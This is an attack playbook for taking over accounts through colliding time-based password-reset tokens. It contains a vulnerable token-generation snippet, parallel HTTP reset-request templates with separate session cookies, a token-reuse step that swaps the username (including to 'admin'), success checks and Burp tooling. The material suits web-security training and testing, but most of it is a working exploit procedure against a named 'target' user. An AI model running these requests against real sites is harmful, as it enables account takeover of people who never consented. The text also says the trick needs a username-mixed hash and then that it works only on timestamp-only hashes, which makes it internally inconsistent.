# Time-Sensitive Token Collision (Password Reset / Session Token)

## When this applies

- Token generation includes a timestamp (e.g., `hash(username + str(time.time()))`).
- Two parallel requests for different users land in the same millisecond — same timestamp, same hash inputs (other than username).
- If hashing is weak or the timestamp dominates, the resulting tokens collide or are predictable.

## Technique

Send two parallel password-reset requests for two different usernames using DIFFERENT session cookies (to bypass per-session locking). Both tokens are generated from the same timestamp; if the username doesn't change the bucket, they collide.

**Vulnerable Code:**
```python
token = hash(username + str(time.time()))
```

**Attack Pattern:** Parallel reset requests with different sessions.

**Success Signature:** Two emails with identical tokens; token works for both users.

## Steps

### Request templates

```http
# Request 1: Your account (new session)
POST /forgot-password HTTP/2
Host: target.com
Cookie: session=SESSION_1
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN_1&username=youruser

# Request 2: Target account (different session)
POST /forgot-password HTTP/2
Host: target.com
Cookie: session=SESSION_2
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN_2&username=targetuser
```

### Obtaining different sessions

```http
GET /forgot-password HTTP/2
Host: target.com
# Response includes new session cookie
```

### Exploitation

- Parallel requests processed at same timestamp
- Both tokens generated from same timestamp value
- Tokens are identical for both users

### Token reuse

```
Original: /reset?token=ABC123&username=youruser
Modified: /reset?token=ABC123&username=targetuser
```

## Verifying success

- Receiving the email/token at YOUR address whose payload also unlocks the TARGET user's account.
- Pasting the same token into the reset URL with `username=admin` succeeds.
- Two reset emails arrive with identical token strings.

## Common pitfalls

- Token may include username in the hash mix — collision still requires brute force; use this when token is `hash(timestamp)` only.
- Server may use `secrets.token_urlsafe()` (CSPRNG) — not vulnerable; check token format first.
- Different sessions are required to bypass per-session DB locks.

## Tools

- Burp Turbo Intruder (with two distinct cookies in two queued requests)
- Burp Repeater (manual replay with username swap)
- Catch-all email service to observe both reset emails
